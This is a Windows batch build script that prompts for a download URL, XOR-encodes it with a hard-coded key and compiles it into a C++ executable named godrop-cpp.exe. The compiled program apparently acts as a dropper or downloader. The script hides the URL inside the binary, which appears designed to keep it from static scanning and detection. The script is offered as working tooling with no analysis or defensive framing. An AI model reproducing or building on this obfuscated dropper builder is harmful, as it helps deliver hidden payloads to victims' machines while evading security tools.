@echo off
setlocal

set /p URL=Enter direct artifact URL (http/https): 
if "%URL%"=="" (
  echo URL is required.
  exit /b 1
)

if not exist ..\..\dist mkdir ..\..\dist

for /f "usebackq delims=" %%H in (`powershell -NoProfile -Command "$k=[Text.Encoding]::UTF8.GetBytes('GoDropEmbedKey2026');$u=[Text.Encoding]::UTF8.GetBytes($env:URL);$o=for($i=0;$i -lt $u.Length;$i++){ '{0:x2}' -f ($u[$i] -bxor $k[$i %% $k.Length]) };($o -join '')"`) do set ENC_URL=%%H
if "%ENC_URL%"=="" (
  echo Failed to encrypt URL.
  exit /b 1
)

powershell -NoProfile -Command "(Get-Content main.cpp -Raw).Replace('__ENC_URL__','%ENC_URL%') | Set-Content generated_main.cpp"
if errorlevel 1 exit /b 1

echo Building C++ executable (MSVC cl expected)...
cl /EHsc /std:c++17 generated_main.cpp /Fe:..\..\dist\godrop-cpp.exe
if errorlevel 1 exit /b 1

del generated_main.cpp >nul 2>&1

echo Built: ..\..\dist\godrop-cpp.exe
echo Embedded encrypted URL in binary.
endlocal
